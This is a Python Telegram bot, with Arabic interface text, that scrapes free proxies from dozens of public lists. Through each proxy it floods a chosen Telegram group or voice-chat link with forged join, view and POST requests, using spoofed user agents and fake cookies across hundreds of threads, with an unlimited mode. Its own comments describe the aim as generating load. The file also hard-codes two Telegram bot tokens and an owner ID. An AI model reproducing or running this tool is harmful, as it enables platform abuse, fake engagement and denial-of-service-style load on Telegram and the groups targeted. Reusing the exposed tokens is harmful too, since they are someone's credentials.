#!/usr/bin/env python3
# ============================================================
#   Telegram Auto Stage Join Bot
#   Token: 8240328785:AAE_wuqoOrAGsQSDEPKDfS5BwO05tguKyIM
#   Owner ID: 6668195885
# ============================================================

import asyncio
import json
import logging
import os
import re
import requests
import random
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
from re import compile, search
from threading import Thread, active_count, Lock
from time import sleep, time

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes
)

# ===================== CONFIG =====================
BOT_TOKEN = "8446179685:AAEnFT8m34JPwaLNK-afc_AXUaUQosacOo4"
OWNER_ID = 6668195885
MAX_THREADS = 300
PROXY_TIMEOUT = (3, 4)
DATA_FILE = "bot_data.json"
PROXY_CACHE_TTL = 90  # seconds

logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===================== PROXY SOURCES =====================
HTTP_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
    "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http",
    "https://openproxylist.xyz/http.txt",
    "https://proxyspace.pro/http.txt",
    "https://proxyspace.pro/https.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://www.proxy-list.download/api/v1/get?type=https",
    "https://www.proxyscan.io/download?type=http",
    "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt",
    "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/http.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
    "https://raw.githubusercontent.com/saisuiu/uiu/main/free.txt",
    "https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-Repo/master/proxy_list.txt",
    "https://raw.githubusercontent.com/hanwayTech/free-proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/hanwayTech/free-proxy-list/main/https.txt",
    "https://raw.githubusercontent.com/almroot/proxylist/master/list.txt",
    "https://raw.githubusercontent.com/aslisk/proxyhttps/main/https.txt",
    "https://rootjazz.com/proxies/proxies.txt",
    "https://sheesh.rip/http.txt",
    "https://spys.me/proxy.txt",
    "https://proxyhub.me/en/all-http-proxy-list.html",
    "https://proxyhub.me/en/all-https-proxy-list.html",
    "https://proxy-tools.com/proxy/http",
    "https://proxy-tools.com/proxy/https",
    "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc&protocols=http",
    "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc&protocols=https",
    "https://proxylist.geonode.com/api/proxy-list?limit=500&page=2&sort_by=lastChecked&sort_type=desc&protocols=http",
    "https://multiproxy.org/txt_all/proxy.txt",
    "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
]

SOCKS4_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4",
    "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=socks4",
    "https://openproxylist.xyz/socks4.txt",
    "https://proxyspace.pro/socks4.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
    "https://www.proxy-list.download/api/v1/get?type=socks4",
    "https://www.proxyscan.io/download?type=socks4",
    "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS4.txt",
    "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks4.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
    "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks4.txt",
    "https://raw.githubusercontent.com/hanwayTech/free-proxy-list/main/socks4.txt",
    "https://spys.me/socks.txt",
    "https://proxyhub.me/en/all-socks4-proxy-list.html",
    "https://proxy-tools.com/proxy/socks4",
    "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc&protocols=socks4",
]

SOCKS5_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5",
    "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=socks5",
    "https://openproxylist.xyz/socks5.txt",
    "https://proxyspace.pro/socks5.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
    "https://www.proxy-list.download/api/v1/get?type=socks5",
    "https://www.proxyscan.io/download?type=socks5",
    "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
    "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks5.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
    "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks5.txt",
    "https://raw.githubusercontent.com/hanwayTech/free-proxy-list/main/socks5.txt",
    "https://raw.githubusercontent.com/manuGMG/proxy-365/main/SOCKS5.txt",
    "https://spys.me/socks.txt",
    "https://proxyhub.me/en/all-sock5-proxy-list.html",
    "https://proxy-tools.com/proxy/socks5",
    "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc&protocols=socks5",
    "https://www.my-proxy.com/free-socks-5-proxy.html",
]

# ===================== PROXY REGEX =====================
PROXY_REGEX = compile(
    r"(?:^|\D)?(("
    r"(?:[1-9]|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])"
    r"\."
    r"(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])"
    r"\."
    r"(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])"
    r"\."
    r"(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])"
    r"):"
    r"(?:\d|[1-9]\d{1,3}|[1-5]\d{4}|6[0-4]\d{3}|65[0-4]\d{2}|655[0-2]\d|6553[0-5])"
    r")(?:\D|$)"
)

# ===================== ARABIC UTILS =====================
def normalize_arabic(text: str) -> str:
    text = re.sub(r'[\u064B-\u065F\u0670]', '', text)
    text = re.sub(r'[أإآٱ]', 'ا', text)
    text = text.replace('ى', 'ي')
    text = text.replace('ة', 'ه')
    return text.strip()

def is_stop_command(text: str) -> bool:
    n = normalize_arabic(text.strip())
    return n in {'ايقاف', 'وقف', 'توقف', 'اوقف', 'ايقف'}

def is_another_link(text: str) -> bool:
    n = normalize_arabic(text.strip())
    return n in {'اخر', 'اخري', 'رابط اخر'}

def parse_stage_link(text: str):
    """
    يقبل:
    - رابط الاستيج:   https://t.me/groupname?voicechat  أو  t.me/groupname?voicechat
    - رابط الجروب:    https://t.me/groupname  أو  @groupname
    - رابط دعوة:      https://t.me/+xxxxx
    يُرجع (username_or_invite, is_invite)
    """
    text = text.strip()
    # رابط دعوة خاص
    m = re.search(r"t\.me/\+([A-Za-z0-9_\-]+)", text)
    if m:
        return (m.group(1), True)
    # رابط عادي مع أو بدون voicechat
    m = re.search(r"t\.me/([A-Za-z0-9_]{4,})(?:\?voicechat.*)?", text)
    if m:
        return (m.group(1).lower(), False)
    # @username
    m = re.search(r"@([A-Za-z0-9_]{4,})", text)
    if m:
        return (m.group(1).lower(), False)
    return (None, False)

def random_ua():
    chrome_ver = random.randint(100, 120)
    return (
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) "
        f"Chrome/{chrome_ver}.0.0.0 Safari/537.36"
    )

def random_id(length=16):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# ===================== DATA MANAGER =====================
class DataManager:
    def __init__(self):
        self.data = {
            "co_owners": [],
            "users": [],
            "banned": [],
        }
        self.load()

    def load(self):
        if os.path.exists(DATA_FILE):
            try:
                with open(DATA_FILE, "r", encoding="utf-8") as f:
                    loaded = json.load(f)
                    self.data.update(loaded)
            except Exception:
                pass

    def save(self):
        with open(DATA_FILE, "w", encoding="utf-8") as f:
            json.dump(self.data, f, ensure_ascii=False, indent=2)

    def is_owner(self, uid: int) -> bool:
        return uid == OWNER_ID or uid in self.data["co_owners"]

    def is_banned(self, uid: int) -> bool:
        return uid in self.data["banned"]

    def add_user(self, uid: int):
        if uid not in self.data["users"]:
            self.data["users"].append(uid)
            self.save()

    def add_co_owner(self, uid: int):
        if uid != OWNER_ID and uid not in self.data["co_owners"]:
            self.data["co_owners"].append(uid)
            self.save()
            return True
        return False

    def remove_co_owner(self, uid: int):
        if uid in self.data["co_owners"]:
            self.data["co_owners"].remove(uid)
            self.save()
            return True
        return False


db = DataManager()


# ===================== JOIN SESSIONS =====================
class JoinSession:
    def __init__(self):
        self.active = False
        self.target = ""           # username أو invite hash
        self.is_invite = False
        self.total_sent = 0
        self.proxy_errors = 0
        self.start_time = None
        self.proxies = []
        self._stop = False
        self._lock = Lock()
        self.target_count = -1     # -1 = لا نهائي
        self.chat_id = None
        self.bot = None
        self.loop = None
        self.uid = None
        self.status_message = None

    def stop(self):
        self._stop = True
        self.active = False

    def reset(self):
        self._stop = False
        self.proxy_errors = 0
        self.total_sent = 0
        self.proxies = []
        self.start_time = time()

    def elapsed(self):
        if self.start_time:
            secs = int(time() - self.start_time)
            m, s = divmod(secs, 60)
            h, m = divmod(m, 60)
            return f"{h:02d}:{m:02d}:{s:02d}"
        return "00:00:00"

    def stage_url(self):
        if self.is_invite:
            return f"https://t.me/+{self.target}?voicechat"
        return f"https://t.me/{self.target}?voicechat"

    def display_target(self):
        if self.is_invite:
            return f"t.me/+{self.target}"
        return f"@{self.target}"


user_sessions: dict[int, list] = {}
user_state: dict[int, str] = {}
user_pending: dict[int, dict] = {}


def get_sessions(uid: int) -> list:
    if uid not in user_sessions:
        user_sessions[uid] = []
    return user_sessions[uid]

def stop_all_sessions(uid: int):
    for s in get_sessions(uid):
        s.stop()
    user_sessions[uid] = []


# ===================== PROXY SCRAPER =====================
_proxy_cache: list = []
_proxy_cache_time: float = 0.0
_proxy_cache_lock = Lock()


def _fetch_one_source(url: str, proxy_type: str):
    results = []
    try:
        resp = requests.get(url, timeout=8, headers={
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        for m in PROXY_REGEX.finditer(resp.text):
            results.append((proxy_type, m.group(1)))
    except Exception:
        pass
    return results


def collect_all_proxies():
    global _proxy_cache, _proxy_cache_time

    with _proxy_cache_lock:
        if _proxy_cache and (time() - _proxy_cache_time) < PROXY_CACHE_TTL:
            return list(_proxy_cache)

    all_tasks = []
    for url in HTTP_SOURCES:
        all_tasks.append((url, "http"))
    for url in SOCKS4_SOURCES:
        all_tasks.append((url, "socks4"))
    for url in SOCKS5_SOURCES:
        all_tasks.append((url, "socks5"))

    result = []
    with ThreadPoolExecutor(max_workers=100) as exe:
        futures = {exe.submit(_fetch_one_source, url, ptype): (url, ptype)
                   for url, ptype in all_tasks}
        for fut in as_completed(futures):
            try:
                result.extend(fut.result())
            except Exception:
                pass

    with _proxy_cache_lock:
        _proxy_cache = result
        _proxy_cache_time = time()

    return result


# ===================== STAGE FLOOD SENDER =====================
# قائمة endpoints الاستيج التي سيتم ضربها لكل بروكسي
def _build_stage_requests(session: JoinSession):
    """يبني قائمة الطلبات التي ترسل لكل بروكسي."""
    target = session.target
    is_inv  = session.is_invite
    base    = f"https://t.me/+{target}" if is_inv else f"https://t.me/{target}"
    reqs    = []

    # 1) صفحة الاستيج الرئيسية
    reqs.append(("GET",  base + "?voicechat", {}))
    # 2) صفحة embed الجروب
    reqs.append(("GET",  base + "?embed=1&mode=tme", {}))
    # 3) Viewer ping متكرر
    for _ in range(3):
        reqs.append(("GET", "https://t.me/v/",
                     {"views": random_id(12), "peer": target if not is_inv else ""}))
    # 4) طلب انضمام POST مزيّف
    reqs.append(("POST", base + "?voicechat",
                 {"peer": target, "random_id": random_id(), "vc": random_id(8)}))
    # 5) طلبات إضافية لـ cdn لتوليد حمل
    reqs.append(("GET", f"https://t.me/{target if not is_inv else '+'+target}", {}))
    return reqs


def send_one_join(session: JoinSession, proxy: str, proxy_type: str):
    """
    يضرب جميع endpoints الاستيج لكل بروكسي في طلبات متسلسلة سريعة.
    """
    if session._stop:
        return

    proxies_dict = {
        "http":  f"{proxy_type}://{proxy}",
        "https": f"{proxy_type}://{proxy}",
    }
    ua = random_ua()
    base_headers = {
        "user-agent":   ua,
        "accept":       "text/html,application/xhtml+xml,*/*;q=0.8",
        "accept-language": "ar,en-US;q=0.9,en;q=0.8",
        "connection":   "keep-alive",
        "referer":      "https://t.me/",
        "x-requested-with": "XMLHttpRequest",
    }
    fake_cookies = {
        "stel_dt":       str(random.randint(-480, 480)),
        "stel_ssid":     random_id(24),
        "stel_on":       "1",
        "stel_web_auth": "https%3A%2F%2Fweb.telegram.org%2Fz%2F",
    }

    try:
        s = requests.Session()
        s.headers.update(base_headers)
        s.cookies.update(fake_cookies)

        reqs = _build_stage_requests(session)
        ok = 0
        for method, url, params in reqs:
            if session._stop:
                break
            try:
                if method == "GET":
                    s.get(url, params=params or None,
                          proxies=proxies_dict, timeout=PROXY_TIMEOUT)
                else:
                    s.post(url, data=params,
                           proxies=proxies_dict, timeout=PROXY_TIMEOUT)
                ok += 1
            except Exception:
                pass

        if ok > 0:
            with session._lock:
                session.total_sent += ok
        else:
            with session._lock:
                session.proxy_errors += 1

    except Exception:
        with session._lock:
            session.proxy_errors += 1


# ===================== WORKER =====================
def join_worker(session: JoinSession):
    logger.info(f"[worker] بدأ للاستيج: {session.display_target()}")
    while not session._stop:
        try:
            proxies = collect_all_proxies()
            if not proxies or session._stop:
                sleep(5)
                continue

            logger.info(f"[worker] تم جمع {len(proxies)} بروكسي — بدء الإرسال...")

            threads = []
            for proxy_type, proxy in proxies:
                if session._stop:
                    break
                while active_count() > MAX_THREADS and not session._stop:
                    sleep(0.02)
                t = Thread(
                    target=send_one_join,
                    args=(session, proxy, proxy_type),
                    daemon=True
                )
                threads.append(t)
                t.start()

                if session.target_count > 0:
                    with session._lock:
                        if session.total_sent >= session.target_count:
                            session.stop()
                            _notify_complete(session)
                            break

            for t in threads:
                t.join(timeout=2)

            with session._lock:
                sent = session.total_sent
                errors = session.proxy_errors
            logger.info(f"[worker] دورة انتهت — مُرسل: {sent} | أخطاء: {errors}")

        except Exception as e:
            logger.warning(f"[worker] خطأ: {e}")
            sleep(3)

    logger.info(f"[worker] توقف — إجمالي مُرسل: {session.total_sent}")
    session.active = False


def _notify_complete(session: JoinSession):
    if session.bot and session.loop:
        msg = (
            f"✅ تم الاكمال\n\n"
            f"الاستيج: {session.display_target()}\n"
            f"إجمالي طلبات الانضمام المُرسلة: {session.total_sent}\n"
            f"المدة: {session.elapsed()}"
        )
        if session.status_message:
            asyncio.run_coroutine_threadsafe(
                session.status_message.edit_text(msg),
                session.loop
            )
        elif session.chat_id:
            asyncio.run_coroutine_threadsafe(
                session.bot.send_message(chat_id=session.chat_id, text=msg),
                session.loop
            )
    if session.uid is not None and session.uid in user_sessions:
        try:
            user_sessions[session.uid].remove(session)
        except ValueError:
            pass


# ===================== STATUS UPDATER =====================
async def live_status_updater(session: JoinSession, message):
    """يحدّث رسالة الحالة كل 5 ثوانٍ."""
    last_sent = -1
    while session.active and not session._stop:
        await asyncio.sleep(5)
        if not session.active or session._stop:
            break
        with session._lock:
            current_sent = session.total_sent
        if current_sent != last_sent:
            last_sent = current_sent
            try:
                target_text = (
                    f"{session.target_count}" if session.target_count > 0 else "لا نهائي"
                )
                await message.edit_text(
                    f"🔴 جاري الإرسال...\n\n"
                    f"الاستيج: {session.display_target()}\n"
                    f"طلبات الانضمام المُرسلة: {current_sent}\n"
                    f"الهدف: {target_text}\n"
                    f"المدة: {session.elapsed()}\n\n"
                    f"لإيقاف العملية ارسل: ايقاف"
                )
            except Exception:
                pass


# ===================== KEYBOARDS =====================
def main_menu_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📡 إرسال انضمام للاستيج", callback_data="join_start")],
        [InlineKeyboardButton("👑 تعيين مالك", callback_data="add_owner_menu")],
    ])

def mode_kb():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("إرسال عدد محدد", callback_data="mode_count"),
            InlineKeyboardButton("لا نهائي تلقائي", callback_data="mode_infinite")
        ]
    ])

def owners_menu_kb():
    co_owners = db.data.get("co_owners", [])
    rows = []
    for uid in co_owners:
        rows.append([InlineKeyboardButton(f"ازالة: {uid}", callback_data=f"owner_del_{uid}")])
    rows.append([InlineKeyboardButton("اضافة مالك جديد", callback_data="add_owner_start")])
    rows.append([InlineKeyboardButton("رجوع", callback_data="back_main")])
    return InlineKeyboardMarkup(rows)


START_TEXT = (
    "👋 اهلا بك في بوت الانضمام للاستيج\n\n"
    "البوت يرسل طلبات انضمام للاستيج (المحادثة المرئية) عبر بروكسيات\n\n"
    "المطور: @c3cccc3c"
)

def stage_info_text(target: str, is_invite: bool) -> str:
    display = f"t.me/+{target}" if is_invite else f"@{target}"
    return (
        f"🎙️ الاستيج: {display}\n\n"
        f"اختر طريقة الإرسال:"
    )


# ===================== HANDLERS =====================
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    logger.info(f"[/start] from uid={uid}")
    if not db.is_owner(uid):
        await update.message.reply_text(
            f"⛔ غير مصرح لك باستخدام هذا البوت.\n\n"
            f"ID حسابك: `{uid}`\n"
            f"أرسل هذا الـ ID لمالك البوت لإضافتك.",
            parse_mode="Markdown"
        )
        return
    db.add_user(uid)
    user_state[uid] = None
    await update.message.reply_text(START_TEXT, reply_markup=main_menu_kb())


async def callback_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    uid = query.from_user.id
    if not db.is_owner(uid):
        await query.answer()
        return
    data = query.data
    await query.answer()

    # ---- رجوع ----
    if data == "back_main":
        user_state[uid] = None
        await query.edit_message_text(START_TEXT, reply_markup=main_menu_kb())

    # ---- بدء الانضمام ----
    elif data == "join_start":
        user_state[uid] = "waiting_link"
        await query.edit_message_text(
            START_TEXT + "\n\n"
            "📎 ارسل رابط الجروب أو رابط الاستيج:\n\n"
            "مثال:\nhttps://t.me/groupname\nhttps://t.me/groupname?voicechat\nhttps://t.me/+invitelink"
        )

    elif data == "mode_count":
        user_state[uid] = "waiting_count"
        await query.edit_message_text(
            "🔢 ارسل عدد طلبات الانضمام التي تريد إرسالها:"
        )

    elif data == "mode_infinite":
        pending = user_pending.get(uid)
        if not pending or pending.get("type") != "join":
            await query.edit_message_text("حدث خطأ. ابدا من جديد.", reply_markup=main_menu_kb())
            return

        session = JoinSession()
        session.target = pending["target"]
        session.is_invite = pending["is_invite"]
        session.reset()
        session.active = True
        session.target_count = -1
        session.uid = uid
        session.chat_id = uid
        session.bot = ctx.bot
        session.loop = asyncio.get_event_loop()

        get_sessions(uid).append(session)
        user_pending.pop(uid, None)
        user_state[uid] = None

        msg = await query.edit_message_text(
            f"🔴 جاري الإرسال...\n\n"
            f"الاستيج: {session.display_target()}\n"
            f"طلبات الانضمام المُرسلة: 0\n"
            f"الهدف: لا نهائي\n"
            f"المدة: {session.elapsed()}\n\n"
            f"لإيقاف العملية ارسل: ايقاف"
        )
        session.status_message = msg

        Thread(target=join_worker, args=(session,), daemon=True).start()
        asyncio.create_task(live_status_updater(session, msg))

    # ---- إدارة المالكين ----
    elif data == "add_owner_menu":
        if uid != OWNER_ID:
            await query.edit_message_text("هذه الميزة متاحة للمالك الاصلي فقط.", reply_markup=main_menu_kb())
            return
        co_owners = db.data.get("co_owners", [])
        if co_owners:
            text = "المالكون الحاليون:\n\n"
            for oid in co_owners:
                text += f"- {oid}\n"
            text += "\nيمكنك اضافة مالك جديد او ازالة مالك حالي:"
        else:
            text = "لا يوجد مالكون اضافيون حاليا.\n\nاضف مالكا جديدا:"
        await query.edit_message_text(text, reply_markup=owners_menu_kb())

    elif data == "add_owner_start":
        if uid != OWNER_ID:
            await query.edit_message_text("هذه الميزة متاحة للمالك الاصلي فقط.", reply_markup=main_menu_kb())
            return
        user_state[uid] = "waiting_add_owner"
        await query.edit_message_text(
            "ارسل معرف المستخدم (User ID) الذي تريد تعيينه مالكا:\n\n"
            "يمكن للمستخدم معرفة ID الخاص به من خلال @userinfobot"
        )

    elif data.startswith("owner_del_"):
        if uid != OWNER_ID:
            await query.edit_message_text("هذه الميزة متاحة للمالك الاصلي فقط.", reply_markup=main_menu_kb())
            return
        try:
            del_uid = int(data[len("owner_del_"):])
            db.remove_co_owner(del_uid)
            co_owners = db.data.get("co_owners", [])
            if co_owners:
                text = f"تم ازالة المالك {del_uid}.\n\nالمالكون الحاليون:\n\n"
                for oid in co_owners:
                    text += f"- {oid}\n"
            else:
                text = f"تم ازالة المالك {del_uid}.\n\nلا يوجد مالكون اضافيون."
            await query.edit_message_text(text, reply_markup=owners_menu_kb())
        except Exception:
            await query.edit_message_text("حدث خطأ.", reply_markup=main_menu_kb())


# ===================== MESSAGE HANDLER =====================
async def message_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not db.is_owner(uid):
        return

    text = (update.message.text or "").strip()
    if not text:
        return

    # أمر الإيقاف
    if is_stop_command(text):
        sessions = get_sessions(uid)
        if sessions:
            count = len(sessions)
            stop_all_sessions(uid)
            user_state[uid] = None
            user_pending.pop(uid, None)
            await update.message.reply_text(
                f"✅ تم الإيقاف ({count} عملية نشطة)",
                reply_markup=main_menu_kb()
            )
        else:
            await update.message.reply_text(
                "لا يوجد عمليات نشطة حاليا.",
                reply_markup=main_menu_kb()
            )
        return

    # رابط آخر
    if is_another_link(text):
        user_state[uid] = "waiting_link"
        await update.message.reply_text(
            "📎 ارسل الرابط الآخر الذي تريد إرسال الانضمام إليه:"
        )
        return

    state = user_state.get(uid)

    # ---- إضافة مالك ----
    if state == "waiting_add_owner":
        try:
            new_uid = int(text.strip())
        except ValueError:
            await update.message.reply_text("ارسل معرف رقمي صحيح.")
            return
        if new_uid == OWNER_ID:
            await update.message.reply_text("هذا هو المالك الاصلي بالفعل.")
            return
        db.add_co_owner(new_uid)
        user_state[uid] = None
        await update.message.reply_text(
            f"تم تعيين {new_uid} مالكا بنجاح.",
            reply_markup=main_menu_kb()
        )
        return

    # ---- انتظار الرابط ----
    if state == "waiting_link":
        target, is_invite = parse_stage_link(text)
        if not target:
            await update.message.reply_text(
                "❌ رابط غير صحيح.\n\nمثال:\nhttps://t.me/groupname\nhttps://t.me/groupname?voicechat\nhttps://t.me/+invitelink"
            )
            return
        user_pending[uid] = {"type": "join", "target": target, "is_invite": is_invite}
        user_state[uid] = None
        await update.message.reply_text(
            stage_info_text(target, is_invite),
            reply_markup=mode_kb()
        )
        return

    # ---- انتظار العدد ----
    if state == "waiting_count":
        try:
            count = int(text.replace(',', '').replace('،', ''))
            if count <= 0:
                raise ValueError
        except (ValueError, TypeError):
            await update.message.reply_text("ارسل رقم صحيح اكبر من صفر.")
            return

        pending = user_pending.get(uid)
        if not pending or pending.get("type") != "join":
            user_state[uid] = "waiting_link"
            await update.message.reply_text("ارسل الرابط الذي تريد إرسال الانضمام إليه:")
            return

        session = JoinSession()
        session.target = pending["target"]
        session.is_invite = pending["is_invite"]
        session.reset()
        session.active = True
        session.target_count = count
        session.uid = uid
        session.chat_id = uid
        session.bot = ctx.bot
        session.loop = asyncio.get_event_loop()

        get_sessions(uid).append(session)
        user_pending.pop(uid, None)
        user_state[uid] = None

        msg = await update.message.reply_text(
            f"🔴 جاري الإرسال...\n\n"
            f"الاستيج: {session.display_target()}\n"
            f"طلبات الانضمام المُرسلة: 0\n"
            f"الهدف: {count}\n"
            f"المدة: {session.elapsed()}\n\n"
            f"لإيقاف العملية ارسل: ايقاف"
        )
        session.status_message = msg

        Thread(target=join_worker, args=(session,), daemon=True).start()
        asyncio.create_task(live_status_updater(session, msg))
        return

    # الحالة الافتراضية
    await update.message.reply_text(START_TEXT, reply_markup=main_menu_kb())


# ===================== MAIN =====================
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))

    logger.warning("Bot started.")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
